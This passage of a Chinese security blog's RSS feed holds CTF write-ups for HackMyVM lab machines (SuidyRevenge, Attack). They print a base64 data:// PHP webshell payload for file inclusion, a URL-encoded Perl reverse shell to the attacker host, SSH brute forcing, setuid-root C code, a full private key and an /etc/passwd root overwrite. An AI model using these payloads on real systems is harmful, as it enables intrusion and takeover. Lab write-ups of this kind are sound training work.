                             \*,                .\*
                                \*.           \*\*
                                  \*\*      ,\*,
                                     \*\* \*,
-------------------------

PWNED HOST: light

PWNED DATE: Mon 18 Nov 2024 02:22:04 AM EST

WHOAMI: uid=0(root) gid=0(root) groups=0(root)

FLAG: ilovepython
]]></description><link>https://www.c1trus.top/24-渗透/hmv/18.light.html</link><guid isPermaLink="false">24-渗透/HMV/18.Light.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[17.SuidyReverse]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 目录扫描" data-href="#2.1. 目录扫描" href="https://www.c1trus.top/about:blank#2.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 目录扫描</a>


<br><a data-tooltip-position="top" aria-label="3. RFL利用反弹shell" data-href="#3. RFL利用反弹shell" href="https://www.c1trus.top/about:blank#3._RFL利用反弹shell" class="internal-link" target="_self" rel="noopener nofollow">3. RFL利用反弹shell</a>

<br><a data-tooltip-position="top" aria-label="3.1. 利用data伪协议试试" data-href="#3.1. 利用data伪协议试试" href="https://www.c1trus.top/about:blank#3.1._利用data伪协议试试" class="internal-link" target="_self" rel="noopener nofollow">3.1. 利用data伪协议试试</a>


<br><a data-tooltip-position="top" aria-label="4. 提权murda" data-href="#4. 提权murda" href="https://www.c1trus.top/about:blank#4._提权murda" class="internal-link" target="_self" rel="noopener nofollow">4. 提权murda</a>
<br><a data-tooltip-position="top" aria-label="5. 提权theuser" data-href="#5. 提权theuser" href="https://www.c1trus.top/about:blank#5._提权theuser" class="internal-link" target="_self" rel="noopener nofollow">5. 提权theuser</a>
<br><a data-tooltip-position="top" aria-label="6. 提权root" data-href="#6. 提权root" href="https://www.c1trus.top/about:blank#6._提权root" class="internal-link" target="_self" rel="noopener nofollow">6. 提权root</a>
<br><a data-tooltip-position="top" aria-label="7. 拓展" data-href="#7. 拓展" href="https://www.c1trus.top/about:blank#7._拓展" class="internal-link" target="_self" rel="noopener nofollow">7. 拓展</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=SuidyRevenge
<br>作者：sml
<br>难度：⭐️⭐️⭐️
<br>知识点：RFI 、data伪协议 、SUID文件替换、mv与cp
<br><br>nmap -sV -sS 192.168.56.9 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 19:55 CST
Nmap scan report for 192.168.56.9
Host is up (0.00049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
MAC Address: 08:00:27:C3:F8:55 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
<br><br>主页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png" referrerpolicy="no-referrer"><br>Im proud to announce that "theuser" is not anymore in our servers. Our admin "mudra" is the best admin of the world. -suidy  &lt;!--  "mudra" is not the best admin, IM IN!!!! He only changed my password to a different but I had time to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!  -theuser  --&gt; 
<br>我很自豪地宣布，“theuser”不再在我们的服务器上了。我们的管理员“mudra”是世界上最棒的管理员。 -suidy
&lt;!--  “mudra”并不是最棒的管理员，是我在！他只是把我的密码改了，但我有时间把两个后门（.php文件）从我的KALI放到/supersecure目录里，以保持访问！  -theuser  --&gt;
<br>获取到几个用户名<br>theuser
suidy
mudra
<br>一个路径<br>/supersecure
<br>对路径进行扫描<br>dirsearch -u http://192.168.56.9/supersecure
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html
  from pkg\_resources import DistributionNotFound, VersionConflict

  \_|. \_ \_  \_  \_  \_ \_|\_    v0.4.3
 (\_||| \_) (/\_(\_|| (\_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/suidyreverse/reports/http\_192.168.56.9/\_supersecure\_24-11-17\_20-01-43.txt

Target: http://192.168.56.9/

[20:01:43] Starting: supersecure/
[20:02:02] 200 -   28B  - /supersecure/simple-backdoor.php

Task Completed
<br>访问网站后门<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.002.png" referrerpolicy="no-referrer"><br>利用cmd参数反弹shell<br>没弹成功<br>ls看下有什么东西<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.003.png" referrerpolicy="no-referrer"><br>mysuperbackdoor.php
simple-backdoor.php
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.004.png" referrerpolicy="no-referrer"><br>读一下文件<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.005.png" referrerpolicy="no-referrer"><br>我测，38万条file parameter is my friend.，差点给我卡司机<br>当把simple-backdoor.php 作为File参数时<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.006.png" referrerpolicy="no-referrer"><br>而且也可以使用cmd参数<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.007.png" referrerpolicy="no-referrer"><br><br>可能这里存在文件包含<br>发现存在远程文件包含<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.008.png" referrerpolicy="no-referrer"><br>尝试远程包含get马<br>发现解析不了<br>&lt;?php
system($\_GET['cmd']);
echo 'okok');
?&gt;
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.009.png" referrerpolicy="no-referrer"><br><br>参考：<a data-tooltip-position="top" aria-label="https://kv86gpc7nq5.feishu.cn/wiki/OBfkw1zIjiSgWxkGSdbcKUU1n2h#share-ZmKidIwJho6caLxWO4tcT1K3nah" rel="noopener nofollow" class="external-link" href="https://kv86gpc7nq5.feishu.cn/wiki/OBfkw1zIjiSgWxkGSdbcKUU1n2h#share-ZmKidIwJho6caLxWO4tcT1K3nah" target="_blank">3.quick</a><br>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnb2snIDs/Pg==
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.010.png" referrerpolicy="no-referrer"><br>成功解析<br>执行命令反弹shell<br>http://192.168.56.9/supersecure/mysuperbackdoor.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnb2snIDs/Pg==&amp;cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1122%3Bsocket%28S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr\_in%28%24p%2Cinet\_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.011.png" referrerpolicy="no-referrer"><br><br>进来后发现只能进入suidy用户的目录<br>提权检测一下<br>(remote) www-data@suidyrevenge:/home/suidy$ find / -perm -4000 2&gt;/dev/null
/home/suidy/suidyyyyy
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/mount
/usr/bin/violent
/usr/bin/newgrp
/usr/bin/chfn 
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
(remote) www-data@suidyrevenge:/home/suidy$ /sbin/getcap / -r 2&gt;/dev/null
/usr/bin/ping = cap\_net\_raw+ep
<br>看来应该是要从suidyyyy这个文件下手<br>但是suidyyy这个东西我们没权限啊<br>先试一下可不可以切换到其他用户<br>theuser
suidy
mudra
<br>切换不了。至少简单的密码不对<br>在网站根目录下发现murdanote.txt<br>(remote) www-data@suidyrevenge:/var/www/html$ cat murdanote.txt
I always lost my password so Im using
one password from rockyou.txt !

-murda
<br>这就是说叫我们去爆破他的密码啊<br>hydra -l murda  -P  /usr/share/wordlists/rockyou.txt 192.168.56.9 ssh -vV

[22][ssh] host: 192.168.56.9   login: murda   password: iloveyou
<br>利用ssh工具连接上去<br><br>进来有个提示<br>murda@suidyrevenge:~$ cat secret.txt
I know that theuser is here!
I just got the id\_rsa from "violent".
I will put the key in a secure place for theuser!
I hope he find it.
Remember that rockyou.txt is your friend!
<br>我知道theuser在这里！
我刚刚从“violent”那里拿到了id\_rsa。
我会把这个密钥放在一个安全的地方，供theuser使用！
希望他能找到它。
记住，rockyou.txt是你的朋友！
<br>意思是murda 获取到了violent的私钥，放到了安全的地方给theuser使用<br>那肯定是要我们爆破theuser用户 获取私钥啊<br>爆了半天没出。利用首页给的提示用different成功登录<br>theuser@suidyrevenge:~$ cat user.txt

                                   .     \*\*
                                \*           \*.
                                              ,\*
                                                 \*,
                         ,                         ,\*
                      .,                              \*,
                    /                                    \*
                 ,\*                                        \*,
               /.                                            .\*.
             \*                                                  \*\*
             ,\*                                               ,\*
                \*\*                                          \*.
                   \*\*                                    \*\*.
                     ,\*                                \*\*
                        \*,                          ,\*
                           \*                      \*\*
                             \*,                .\*
                                \*.           \*\*
                                  \*\*      ,\*,
                                     \*\* \*,



HMVbisoususeryay
<br><br>下一步应该就是获取violent用户的私钥<br>几个地方找了下没找到<br>回来看suidyyyy发现当前用户可以执行了<br>theuser@suidyrevenge:/home/suidy$ ls -la
total 52
drwxrwxr-x 3 suidy suidy    4096 Oct  2  2020 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash\_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash\_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwsrws--- 1 root  theuser 16712 Oct  2  2020 suidyyyyy
<br>看看suidy给我们的提示<br>suidy@suidyrevenge:/home/suidy$ cat note.txt
I know that theuser is not here anymore but suidyyyyy is now more secure!
root runs the script as in the past that always gives SUID to suidyyyyy binary
but this time also check the size of the file.
WE DONT WANT MORE "theuser" HERE!.
WE ARE SECURE NOW.

-suidy
<br>我知道theuser不在这里了，但suidyyyyy现在更安全了！
root像过去一样运行脚本，总是给suidyyyyy二进制文件赋予SUID权限，但这次还检查了文件的大小。
我们不希望“theuser”再出现在这里！
我们现在很安全。
-suidy
<br>这里提示我们这个文件会检测文件的大小<br>逆向分析看看<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.012.png" referrerpolicy="no-referrer"><br>直接利用靶机的gcc编译一个与他大小差不多的然后替换掉即可<br># include&lt;stdlib.h&gt;
int main(void){
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
<br>gcc exp.c -o suidyyyyy
<br>很好大小一模一样<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.013.png" referrerpolicy="no-referrer"><br>替换执行<br>这里提权不了 多执行几次<br>root@suidyrevenge:/home/suidy# ./suidyyyyy
root@suidyrevenge:/home/suidy# id
uid=0(root) gid=0(root) groups=0(root),1004(theuser)
<br>root@suidyrevenge:/root# cat script.sh
FILE=/home/suidy/suidyyyyy
if [ -f "$FILE" ]; then
echo ""
        else
   cp /root/suidyyyyy /home/suidy
   chown root:theuser /home/suidy/suidyyyyy
   chmod 770 /home/suidy/suidyyyyy
   chmod +s /home/suidy/suidyyyyy

fi


if [ $(stat -c%s /root/suidyyyyy) -ne $(stat -c%s /home/suidy/suidyyyyy) ]; then
   echo "They're different."
   cp /root/suidyyyyy /home/suidy
   chown root:theuser /home/suidy/suidyyyyy
   chmod 770 /home/suidy/suidyyyyy
   chmod +s /home/suidy/suidyyyyy
else
chmod +s /home/suidy/suidyyyyy
fi

root@suidyrevenge:/root# cat root.txt

                                   .     \*\*
                                \*           \*.
                                              ,\*
                                                 \*,
                         ,                         ,\*
                      .,                              \*,
                    /                                    \*
                 ,\*                                        \*,
               /.                                            .\*.
             \*                                                  \*\*
             ,\*                                               ,\*
                \*\*                                          \*.
                   \*\*                                    \*\*.
                     ,\*                                \*\*
                        \*,                          ,\*
                           \*                      \*\*
                             \*,                .\*
                                \*.           \*\*
                                  \*\*      ,\*,
                                     \*\* \*,


HMVvoilarootlala
<br><br>mv与cp<br>mv: mv移动会影响SUID的权限所属，这题不能用mv移动suidyyyyy，因为会把root的suid变成当前用户的suid<br>cp：cp不会影响]]></description><link>https://www.c1trus.top/24-渗透/hmv/17.suidyreverse.html</link><guid isPermaLink="false">24-渗透/HMV/17.SuidyReverse.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[16. attack]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 目录扫描" data-href="#2.1. 目录扫描" href="https://www.c1trus.top/about:blank#2.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 流量包分析" data-href="#2.2. 流量包分析" href="https://www.c1trus.top/about:blank#2.2._流量包分析" class="internal-link" target="_self" rel="noopener nofollow">2.2. 流量包分析</a>


<br><a data-tooltip-position="top" aria-label="3. 提权" data-href="#3. 提权" href="https://www.c1trus.top/about:blank#3._提权" class="internal-link" target="_self" rel="noopener nofollow">3. 提权</a>
<br><a data-tooltip-position="top" aria-label="4. 再提权" data-href="#4. 再提权" href="https://www.c1trus.top/about:blank#4._再提权" class="internal-link" target="_self" rel="noopener nofollow">4. 再提权</a>
<br><a data-tooltip-position="top" aria-label="5. 拓展" data-href="#5. 拓展" href="https://www.c1trus.top/about:blank#5._拓展" class="internal-link" target="_self" rel="noopener nofollow">5. 拓展</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Attack
<br>作者作者：sml
<br>难度：⭐️⭐️
<br>知识点：cppw命令（替换/etc/passwd）
<br><br>Nmap scan report for 10.16.21.183
Host is up (0.00012s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
<br><br>首页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png" referrerpolicy="no-referrer"><br>根据提示可以知道，存在一个capture名字的流量包，但是后缀不知道是什么了<br>capture.pcap
capture.pcapng
capture.cap
capture.log
capture.ncap
capture.etl
capture.pkt
capture.trace
capture.zip
capture.7z
capture.rar
capture.tar.gz
<br>url拼接尝试一下<br>第一个就是的<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.002.png" referrerpolicy="no-referrer"><br><br>流量包很简单一共就两个流<br>导出对象可以获取到一共图片<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.003.png" referrerpolicy="no-referrer"><br>扫描二维码可以获取到一个文件<br>http://localhost/jackobattack.txt<br>访问获取到一个私钥<br>Hey jackob, you will need this:

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAt1O2ZANL3BPkL32RqWk3ONGDYkw58GyD2rqK0RDRblATgo+9+Vpy
wpavGbvNGF1aph9Mf+Tmn6b95yQ6GiAaDUrtiRJXLR1/27Facslk8grW+/uBFVou4vBLB6
exY/+mbsBZxy54RiKp2WVZ3oKOgQ3ybEWX9BVGp0dRdp16GJmyDVcAMR+g4dc/J0Ee59X8
hKlV6MCmGkTZ1/Bn/CCzwztt3HqTVCK/86cQdzGGYeNDSUKUYYE51Ym00PLb8yhJBelJhR
udo+59dLLdGcyQMiCDbBnO7b/RbhRHUnjuuZHaVmkAGs4FBwahDza1QYMp1Fs1sjbDh0I+
trm4Vci2qQAAA8gBP1jWAT9Y1gAAAAdzc2gtcnNhAAABAQC3U7ZkA0vcE+QvfZGpaTc40Y
NiTDnwbIPauorRENFuUBOCj735WnLClq8Zu80YXVqmH0x/5Oafpv3nJDoaIBoNSu2JElct
HX/bsVpyyWTyCtb7+4EVWi7i8EsHp7Fj/6ZuwFnHLnhGIqnZZVnego6BDfJsRZf0FUanR1
F2nXoYmbINVwAxH6Dh1z8nQR7n1fyEqVXowKYaRNnX8Gf8ILPDO23cepNUIr/zpxB3MYZh
40NJQpRhgTnVibTQ8tvzKEkF6UmFG52j7n10st0ZzJAyIINsGc7tv9FuFEdSeO65kdpWaQ
AazgUHBqEPNrVBgynUWzWyNsOHQj62ubhVyLapAAAAAwEAAQAAAQB79EYmaXQpYemvkp+i
hFmqOT80f4XNYhHlGqwxn8V7aPlIFhjFOLrPh0Lti2WpS7W3DQKUlxi4ahjS6FPAxmPXCQ
qC27vF7WQ+DzSw2CtA3MNvrSYiYc/B8edJTcFLc9f8mmIZovn/sgBV1YlmQbBI4j0/p+6O
QrR69mXGZcPgTSSA73N/eR92Bd5AB4e5PI9Io7Ib/GKUgDtilkGhElJ5EHVq0jVxTWq6lP
WnYm4NIX8Rt3+cOX01ohTDKetbrULrVYqcSPLHLgUjskghP8XqTYwy02LJQoTggHgAKFqt
3M5x5C798R2lHGvTZKkLHeTUzHvcjb+uLun+fFCPSuABAAAAgAVc3cUkXUPGpfzeB7A2CZ
Dq0Vy+auMPGMdQSbYg5GgZhwZzPeGKXWx7a6oVvKvxQ33tGXph6u2Nf9Xz3AIar7vVmoJb
TbpngEMxLcsM1DUT1rORcat+G5g0SVUQRssA8+xT+rxx0n0qnJSjMrxYsnu1FPw8iwCt6g
oLAUKk2RqiAAAAgQDzQ9b9CdPD81PXjOEvW+xgT2r16zarfR+3jZjuf7xEHy7PUIE4mV1r
L3Ap2WRtwEOg+izTfBPJCegDognPWHsqLkgNtPZ4wDwbnfrL//zPNVZkZsknxe6wnZ3gvv
jG0IttS7fPqk+XZ6rwAjYUBkUBCGZlWb5lhSRHQcL3fU1IgQAAAIEAwOyaSNsmJ88xb5xf
+75biKyPhHVAaJtfXnMYo+rsHGIUZIZKmok1em8VTJgGAUs+yJrYF2TvlNmvlv5jrGSNPQ
Tf0wbkfaxG8n2FqtjIpCK222bt5kMZ1uULczCjitOVQpNAFt5mJKeqWUjOLj409luMFKY+
zTtL5/FYdo2LGikAAAANamFja29iQGF0dGFjawECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
<br>应该jackob<br>利用私钥连接上去<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.004.png" referrerpolicy="no-referrer"><br>HMVattackstarted
<br><br>看下提示<br>jackob@attack:~$ cat note.txt 
I need to launch the script to start the attack planned by kratos
我需要启动脚本以开始 Kratos 计划的攻击
<br>jackob@attack:~$ ls -la
total 48
drwxr-xr-x 5 jackob jackob 4096 Nov 16 07:09 .
drwxr-xr-x 5 root   root   4096 Jan  7  2021 ..
-rwxrwxr-- 1 kratos kratos 1023 Jan 10  2021 attack.sh
-rw-r--r-- 1 jackob jackob  220 Jan  7  2021 .bash\_logout
-rw-r--r-- 1 jackob jackob 3526 Jan  7  2021 .bashrc
drwx------ 3 jackob jackob 4096 Nov 16 07:09 .config
-rwx--x--x 1 jackob jackob 1920 Jan  7  2021 flag.sh
drwxr-xr-x 3 jackob jackob 4096 Jan  7  2021 .local
-rw-r--r-- 1 jackob jackob   67 Jan  7  2021 note.txt
-rw-r--r-- 1 jackob jackob  807 Jan  7  2021 .profile
drwx------ 2 jackob jackob 4096 Jan  7  2021 .ssh
-rw------- 1 jackob jackob   17 Jan  7  2021 user.txt
<br>先看下flag.sh<br>里面就是user.txt内容<br>jackob@attack:~$ find / -perm -4000 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
jackob@attack:~$ sudo -l
Matching Defaults entries for jackob on attack:
    !env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jackob may run the following commands on attack:
    (kratos) NOPASSWD: /home/jackob/attack.sh
<br>意思是我们当前jackob用户可以以kratos的权限执行/home/jackob/attack.sh<br>jackob@attack:~$ cat attack.sh 
#!/bin/bash
echo "[+] LAUNCHING ATTACK"
the9command="/usr/bin/id"
the2command="/usr/bin/ls"
the4command="/usr/bin/echo"
the3command="/usr/bin/uptime"
theOcommand="/usr/bin/echo"
the1command="/usr/bin/id"
the6Command="/usr/bin/echo"
the7command="/usr/bin/w"
the8command="/usr/bin/echo"
the5command="/usr/bin/id"

echo "[+] NEXT PHASE"
the10command="/usr/bin/id"
the20command="/usr/bin/echo"
the30command="/usr/bin/echo"
the40command="/usr/bin/w"
the50command="/usr/bin/echo"
the60command="/usr/bin/date"
the70command="/usr/bin/uptime"
the85command="/usr/bin/echo"

echo "[+] FINAL PHASE"
$the1command &gt;&gt; /tmp/a
$the2command &gt;&gt; /tmp/a
$the3command &gt;&gt; /tmp/b
$the4command &gt;&gt; /tmp/b
$the5command &gt;&gt; /tmp/c
$the6command &gt;&gt; /tmp/c
$the7command &gt;&gt; /tmp/d
$the8command &gt;&gt; /tmp/d
$the9command &gt;&gt; /tmp/f
$the0command &gt;&gt; /tmp/f
$the10command &gt;&gt; /tmp/g
$the20command &gt;&gt; /tmp/g
$the30command &gt;&gt; /tmp/h
$the40command &gt;&gt; /tmp/h
$the50command &gt;&gt; /tmp/r
$the60command &gt; /tmp/r
$the70command &gt; /tmp/w
$the85command &gt; /tmp/z

echo "[+] DONE"
<br>在用户teste目录下可以获取到一个mysecret.png<br>常见的几种解密发现都没有啥东西<br>还是把重心放到这个attack.sh上<br>我们修改掉这个attack.sh的内容<br><br>直接把jackob的公钥写进去<br>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3U7ZkA0vcE+QvfZGpaTc40YNiTDnwbIPauorRENFuUBOCj735WnLClq8Zu80YXVqmH0x/5Oafpv3nJDoaIBoNSu2JElctHX/bsVpyyWTyCtb7+4EVWi7i8EsHp7Fj/6ZuwFnHLnhGIqnZZVnego6BDfJsRZf0FUanR1F2nXoYmbINVwAxH6Dh1z8nQR7n1fyEqVXowKYaRNnX8Gf8ILPDO23cepNUIr/zpxB3MYZh40NJQpRhgTnVibTQ8tvzKEkF6UmFG52j7n10st0ZzJAyIINsGc7tv9FuFEdSeO65kdpWaQAazgUHBqEPNrVBgynUWzWyNsOHQj62ubhVyLap jackob@attack" &gt;&gt; /home/kratos/.ssh/authorized\_keys
<br>sudo -u kratos /home/jackob/attack.sh
<br>然后就可以用jackob的私钥连接kratos用户<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.004.png" referrerpolicy="no-referrer"><br><br>检测提权<br>kratos@attack:~$ sudo -l
Matching Defaults entries for kratos on attack:
    !env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kratos may run the following commands on attack:
    (root) NOPASSWD: /usr/sbin/cppw
<br>cppw命令可以用于覆盖/etc/passwd<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.005.png" referrerpolicy="no-referrer"><br>这里我尼玛玩坏了。。。<br>不能瞎复制啊<br>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
teste:x:1000:1000:teste,,,:/home/teste:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
jackob:x:1001:1001:,,,:/home/jackob:/bin/bash
kratos:x:1002:1002:,,,:/home/kratos:/bin/bash
<br>HMVattackr00t
<br><br>这里讲一下<br>/etc/passwd里面的root是<br>root:x:0:0:root:/root:/bin/bash<br>其中x 表示这个密码没有存储在passwd里面 存储在/etc/shadow里面<br>我们将x替换成我们已知的加密密码即可<br>但这个密码的加密方式应该是需要相同的<br>root:$y$j9T$G45VwieJUJvz8NXVR3/CE0$UVbcsJfoy/tK5mlf59P4255orDTFnpTy6JsIodTjo12:0:0:root:/root:/bin/bash
]]></description><link>https://www.c1trus.top/24-渗透/hmv/16.-attack.html</link><guid isPermaLink="false">24-渗透/HMV/16. attack.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[15.Random]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. FTP" data-href="#3. FTP" href="https://www.c1trus.top/about:blank#3._FTP" class="internal-link" target="_self" rel="noopener nofollow">3. FTP</a>
<br><a data-tooltip-position="top" aria-label="4. SFTP" data-href="#4. SFTP" href="https://www.c1trus.top/about:blank#4._SFTP" class="internal-link" target="_self" rel="noopener nofollow">4. SFTP</a>
